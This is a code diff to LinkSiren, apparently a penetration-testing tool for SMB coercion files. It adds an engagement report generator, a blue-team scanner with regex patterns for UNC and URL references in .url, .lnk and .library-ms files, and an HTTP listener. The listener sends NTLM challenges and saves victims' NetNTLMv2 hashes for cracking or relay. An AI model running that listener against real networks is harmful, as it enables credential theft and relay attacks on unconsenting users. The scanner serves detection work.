@@ -35,6 +35,7 @@ from linksiren.pure_functions import (
     compute_threshold_date,
     make_invisible_payload_name,
     make_invisible_payload_contents,
+    info_print,
 )
 
 
@@ -960,3 +961,437 @@ def handle_cleanup(args, credentials):
             "and CRITICAL level events in linksiren.log for details.",
             file=sys.stderr,
         )
+def handle_report(args):
+    """Engagement summary report.
+
+    Builds a markdown document covering everything linksiren did in this
+    engagement directory: files written, hosts where --encrypt fired,
+    hosts where EFS was confirmed-Stopped before our deploy, cleanup
+    leftovers, detect findings, and captured coercion auth events.
+    """
+    from collections import Counter
+    from pathlib import Path
+
+    def _read_lines(p):
+        try:
+            with open(p, encoding="utf-8") as f:
+                return [ln.strip() for ln in f if ln.strip()]
+        except FileNotFoundError:
+            return []
+
+    output_path = args.output
+    log_path = args.logfile
+
+    written = _read_lines("payloads_written.txt")
+    not_deleted = _read_lines("payloads_not_deleted.txt")
+    encrypt_hosts = _read_lines("encrypt_triggered_hosts.txt")
+    efs_started_by_us = _read_lines("efs_started_by_us.txt")
+    detect_lines = _read_lines("detect_findings.txt")
+    capture_lines = _read_lines("coerce_captures.log")
+
+    # Parse the JSON log for high-level events
+    events = []
+    levels = Counter()
+    try:
+        with open(log_path, encoding="utf-8") as f:
+            for ln in f:
+                ln = ln.strip()
+                if not ln:
+                    continue
+                try:
+                    ev = json.loads(ln)
+                except json.JSONDecodeError:
+                    continue
+                events.append(ev)
+                levels[ev.get("Level", "?")] += 1
+    except FileNotFoundError:
+        pass
+
+    written_by_host = Counter()
+    for line in written:
+        if line.startswith("\\\\"):
+            host = line[2:].split("\\", 1)[0]
+            written_by_host[host] += 1
+
+    lines = []
+    lines.append("# LinkSiren Engagement Report")
+    lines.append("")
+    if events:
+        first = events[0].get("Timestamp", "?")
+        last = events[-1].get("Timestamp", "?")
+        lines.append(f"_Events in `{log_path}`: {first} ... {last}_")
+        lines.append("")
+
+    lines.append("## Summary")
+    lines.append("")
+    lines.append(f"- Payloads written: **{len(written)}** across **{len(written_by_host)}** host(s)")
+    lines.append(f"- Hosts that received `--encrypt` payloads: **{len(encrypt_hosts)}**")
+    lines.append(f"- Hosts where EFS was confirmed-Stopped before deploy: **{len(efs_started_by_us)}**")
+    lines.append(f"- Payloads cleanup could NOT delete: **{len(not_deleted)}**")
+    lines.append(f"- Detect findings (this run): **{len(detect_lines)}**")
+    lines.append(f"- Coercion captures recorded: **{len(capture_lines)}**")
+    lines.append("")
+    if levels:
+        lines.append("### Log levels")
+        lines.append("")
+        for lvl in ("CRITICAL", "ERROR", "WARNING", "INFO", "DEBUG"):
+            if levels.get(lvl):
+                lines.append(f"- {lvl}: {levels[lvl]}")
+        lines.append("")
+
+    if written_by_host:
+        lines.append("## Payloads written per host")
+        lines.append("")
+        for host, n in sorted(written_by_host.items()):
+            lines.append(f"- `\\\\{host}`: {n}")
+        lines.append("")
+
+    if encrypt_hosts:
+        lines.append("## Hosts where `--encrypt` fired")
+        lines.append("")
+        for h in encrypt_hosts:
+            sidecar_note = " (EFS was Stopped pre-deploy; eligible for cleanup --stop-efs)" \
+                if h in efs_started_by_us else " (EFS was already Running pre-deploy)"
+            lines.append(f"- `{h}`{sidecar_note}")
+        lines.append("")
+
+    if not_deleted:
+        lines.append("## ⚠ Payloads NOT deleted by cleanup (engagement artifacts)")
+        lines.append("")
+        for p in not_deleted:
+            lines.append(f"- `{p}`")
+        lines.append("")
+
+    if capture_lines:
+        lines.append("## Captured coercion auth events")
+        lines.append("")
+        lines.append("From `coerce_captures.log` (most recent first, truncated to 50):")
+        lines.append("")
+        lines.append("```")
+        for ln in capture_lines[-50:]:
+            lines.append(ln)
+        lines.append("```")
+        lines.append("")
+
+    if detect_lines:
+        lines.append("## Detect findings")
+        lines.append("")
+        lines.append("From `detect_findings.txt`:")
+        lines.append("")
+        lines.append("```")
+        for ln in detect_lines[:50]:
+            lines.append(ln)
+        lines.append("```")
+        lines.append("")
+
+    Path(output_path).write_text("\n".join(lines), encoding="utf-8")
+    info_print(
+        f"report: wrote {output_path} "
+        f"({len(written)} writes, {len(encrypt_hosts)} encrypt hosts, "
+        f"{len(not_deleted)} leftovers, {len(capture_lines)} captures)",
+        file=sys.stderr,
+    )
+
+
+def handle_detect(args, credentials):
+    """Blue-team scanner for coercion-style files.
+
+    Walks each target folder up to ``--max-depth`` and inspects:
+      * ``.url`` files for ``URL=http://...`` or ``IconFile=\\\\<host>\\``
+      * ``.lnk`` files for embedded ``\\\\<host>\\`` UNCs in the icon /
+        target name path (best-effort raw scan, no full lnk parse)
+      * ``.searchConnector-ms`` / ``.library-ms`` for ``<url>`` elements
+        pointing at http or \\\\ UNC
+
+    Each finding is reported with the UNC path of the file, the extracted
+    referenced host(s), and a one-word signature. With
+    ``--include-host-allowlist``, findings that ONLY reference allowed
+    hosts log at INFO rather than WARNING.
+    """
+    import re
+
+    logger = logging.getLogger("main_logger")
+    targets = read_targets(args.targets)
+    max_depth = int(getattr(args, "max_depth", 4) or 4)
+    output_path = getattr(args, "output", "detect_findings.txt")
+    allowlist = set()
+    if getattr(args, "include_host_allowlist", None):
+        with open(args.include_host_allowlist, encoding="utf-8") as f:
+            for ln in f:
+                ln = ln.strip().lower()
+                if ln and not ln.startswith("#"):
+                    allowlist.add(ln)
+
+    PAT_URL = re.compile(r"^URL=(\S+)", re.MULTILINE | re.IGNORECASE)
+    PAT_ICONFILE = re.compile(r"^IconFile=(\\\\[^\r\n]+)", re.MULTILINE | re.IGNORECASE)
+    PAT_XML_URL = re.compile(r"<url>([^<]+)</url>", re.IGNORECASE)
+    PAT_UNC = re.compile(rb"\\\\([A-Za-z0-9._-]{1,255})\\")
+
+    findings = []
+
+    def _scan_text(content: str, ext: str, unc_path: str):
+        hits = []
+        if ext == ".url":
+            for m in PAT_URL.finditer(content):
+                hits.append(("url-URL", m.group(1)))
+            for m in PAT_ICONFILE.finditer(content):
+                hits.append(("url-IconFile-UNC", m.group(1)))
+        elif ext in (".library-ms", ".searchConnector-ms"):
+            for m in PAT_XML_URL.finditer(content):
+                v = m.group(1)
+                if v.startswith("http://") or v.startswith("https://") or v.startswith("\\\\"):
+                    hits.append(("xml-simpleLocation", v))
+        return hits
+
+    def _scan_binary(content: bytes, ext: str, unc_path: str):
+        hits = []
+        if ext == ".lnk":
+            # Find raw UNC patterns (\\<host>\) in the binary content.
+            for m in PAT_UNC.finditer(content):
+                hits.append(("lnk-UNC-ref", "\\\\" + m.group(1).decode("latin1") + "\\..."))
+        return hits
+
+    def _host_of(ref: str) -> str | None:
+        if ref.startswith("http://") or ref.startswith("https://"):
+            try:
+                from urllib.parse import urlparse
+                return urlparse(ref).hostname or None
+            except Exception:
+                return None
+        if ref.startswith("\\\\"):
+            parts = ref[2:].split("\\", 1)
+            return parts[0] if parts else None
+        return None
+
+    INTERESTING_EXTS = {".url", ".lnk", ".library-ms", ".searchConnector-ms"}
+
+    def _walk(target, share: str, folder: str, depth: int):
+        if depth < 0:
+            return
+        try:
+            listings = target.connection.listPath(shareName=share, path=f"{folder}\\*")
+        except Exception as e:
+            logger.debug(
+                "detect: cannot list %s\\%s: %s", share, folder, e,
+                extra={"path": f"\\\\{target.host}\\{share}\\{folder}"},
+            )
+            return
+        for entry in listings:
+            name = entry.get_longname()
+            if name in (".", ".."):
+                continue
+            sub = f"{folder}\\{name}" if folder else name
+            if entry.is_directory():
+                _walk(target, share, sub, depth - 1)
+                continue
+            ext = ""
+            for e in INTERESTING_EXTS:
+                if name.lower().endswith(e.lower()):
+                    ext = e
+                    break
+            if not ext:
+                continue
+            # Read the file
+            try:
+                fh = target.connection.openFile(
+                    target.connection.connectTree(share), sub,
+                )
+                size = entry.get_filesize()
+                data = target.connection.readFile(
+                    target.connection.connectTree(share), fh, 0, min(size, 1024 * 1024),
+                )
+                target.connection.closeFile(target.connection.connectTree(share), fh)
+            except Exception as e:
+                logger.debug(
+                    "detect: cannot read %s\\%s: %s", share, sub, e,
+                    extra={"path": f"\\\\{target.host}\\{share}\\{sub}"},
+                )
+                continue
+            unc_path = f"\\\\{target.host}\\{share}\\{sub}"
+            if ext == ".lnk":
+                hits = _scan_binary(data, ext, unc_path)
+            else:
+                try:
+                    txt = data.decode("utf-8", errors="replace")
+                except Exception:
+                    txt = ""
+                hits = _scan_text(txt, ext, unc_path)
+            for sig, ref in hits:
+                host = _host_of(ref)
+                in_allow = host and host.lower() in allowlist
+                findings.append({
+                    "unc": unc_path, "signature": sig, "ref": ref,
+                    "host": host, "in_allowlist": bool(in_allow),
+                })
+                level = logger.info if in_allow else logger.warning
+                level(
+                    "detect: %s file %s references %s",
+                    sig, unc_path, ref,
+                    extra={"path": unc_path},
+                )
+
+    for target in targets:
+        target.connect(credentials)
+        if target.connection is None:
+            logger.warning(
+                "detect: could not connect", extra={"path": f"\\\\{target.host}"},
+            )
+            continue
+        target.expand_paths()
+        for path in target.paths:
+            share = path.split("\\")[0]
+            folder = "\\".join(path.split("\\")[1:])
+            _walk(target, share, folder, max_depth)
+
+    # Write findings file (tab-separated)
+    with open(output_path, "w", encoding="utf-8") as f:
+        for fnd in findings:
+            f.write(
+                f"{fnd['unc']}\t{fnd['signature']}\t{fnd['ref']}\t"
+                f"{fnd['host'] or ''}\t{'ALLOW' if fnd['in_allowlist'] else 'WARN'}\n"
+            )
+
+    if getattr(args, "json_output", False):
+        print(json.dumps({"mode": "detect", "findings": findings}))
+    else:
+        warn_count = sum(1 for f in findings if not f["in_allowlist"])
+        info_print(
+            f"detect: {len(findings)} finding(s) ({warn_count} non-allowlisted) "
+            f"written to {output_path}",
+            file=sys.stderr,
+        )
+
+
+def handle_listen(args):
+    """Lightweight confirmation listener.
+
+    Runs an HTTP server that accepts and logs:
+      * GET / PROPFIND / OPTIONS requests
+      * NTLM negotiation: sends a 401 challenge, captures both Type-1 and
+        Type-3 messages (NetNTLMv2 lives in Type-3)
+
+    Writes one line per request to ``args.output`` and, when
+    ``args.blobs_dir`` is set, writes any Type-3 blob to its own file
+    so the tester can hand off to hashcat / ntlmrelayx out of band.
+    Not a Responder replacement; this is a confirmation-only signal
+    that a coercion attempt actually fired.
+    """
+    import base64
+    import http.server
+    import socketserver
+    import threading
+    import time
+    import os
+
+    captures_path = args.output
+    blobs_dir = args.blobs_dir
+
+    if blobs_dir:
+        os.makedirs(blobs_dir, exist_ok=True)
+
+    log_lock = threading.Lock()
+
+    def _emit(line: str):
+        ts = time.strftime("%Y-%m-%dT%H:%M:%S")
+        with log_lock:
+            with open(captures_path, "a", encoding="utf-8") as f:
+                f.write(f"{ts} {line}\n")
+            info_print(f"{ts} {line}", file=sys.stderr)
+
+    class _Handler(http.server.BaseHTTPRequestHandler):
+        def do_GET(self): self._handle()
+        def do_PROPFIND(self): self._handle()
+        def do_OPTIONS(self): self._handle()
+        def do_HEAD(self): self._handle()
+
+        def _handle(self):
+            src = self.client_address[0]
+            ua = self.headers.get("User-Agent", "?")
+            auth = self.headers.get("Authorization", "")
+            cmd = self.command
+            path = self.path
+            if not auth:
+                _emit(f"{cmd} {path} from {src} UA={ua!r} no-auth")
+                self.send_response(401)
+                self.send_header("WWW-Authenticate", "NTLM")
+                self.send_header("Content-Length", "0")
+                self.end_headers()
+                return
+            if not auth.startswith("NTLM "):
+                _emit(f"{cmd} {path} from {src} UA={ua!r} other-auth={auth[:40]!r}")
+                self.send_response(200)
+                self.send_header("Content-Length", "0")
+                self.end_headers()
+                return
+            blob_b64 = auth[5:].strip()
+            try:
+                raw = base64.b64decode(blob_b64)
+            except Exception:
+                raw = b""
+            msg_type = raw[8] if len(raw) > 8 else 0
+            label = {1: "Type-1 Negotiate", 2: "Type-2 Challenge",
+                     3: "Type-3 NetNTLMv2"}.get(msg_type, f"Type-{msg_type}")
+            _emit(
+                f"{cmd} {path} from {src} UA={ua!r} NTLMSSP {label} "
+                f"({len(raw)} bytes) blob={blob_b64}"
+            )
+            if msg_type == 3 and blobs_dir:
+                fname = f"{int(time.time())}_{src.replace(':', '_')}.ntlmssp.bin"
+                fpath = os.path.join(blobs_dir, fname)
+                with open(fpath, "wb") as f:
+                    f.write(raw)
+                _emit(f"  -> Type-3 blob saved to {fpath}")
+            if msg_type == 1:
+                # Provide a Type-2 so the client sends Type-3.
+                challenge = base64.b64encode(
+                    b"NTLMSSP\x00\x02\x00\x00\x00"
+                    b"\x00\x00\x00\x00\x00\x00\x00\x00"
+                    b"\x05\x82\x89\x02"
+                    b"\x11\x22\x33\x44\x55\x66\x77\x88"
+                    b"\x00\x00\x00\x00\x00\x00\x00\x00"
+                    b"\x00\x00\x00\x00\x00\x00\x00\x00"
+                ).decode()
+                self.send_response(401)
+                self.send_header("WWW-Authenticate", f"NTLM {challenge}")
+                self.send_header("Content-Length", "0")
+                self.end_headers()
+            else:
+                self.send_response(200)
+                self.send_header("Content-Length", "0")
+                self.end_headers()
+
+        def log_message(self, *a, **kw):
+            pass  # we do our own logging
+
+    class _Reusable(socketserver.ThreadingTCPServer):
+        allow_reuse_address = True
+        daemon_threads = True
+
+    with _Reusable((args.bind, args.port), _Handler) as srv:
+        info_print(
+            f"listen: bound on {args.bind}:{args.port}; captures -> "
+            f"{captures_path}"
+            + (f"; Type-3 blobs -> {blobs_dir}/" if blobs_dir else ""),
+            file=sys.stderr,
+        )
+        if args.timeout and args.timeout > 0:
+            t = threading.Thread(target=srv.shutdown, daemon=True)
+            timer = threading.Timer(args.timeout, srv.shutdown)
+            timer.daemon = True
+            timer.start()
+            try:
+                srv.serve_forever()
+            finally:
+                timer.cancel()
+        else:
+            try:
+                srv.serve_forever()
+            except KeyboardInterrupt:
+                info_print("listen: interrupted, exiting.", file=sys.stderr)
+
+
+def _fmt_running(v):
+    """Compact 3-way running indicator for the check report."""
+    return {True: "running", False: "stopped", None: "unknown"}[v]
+
+
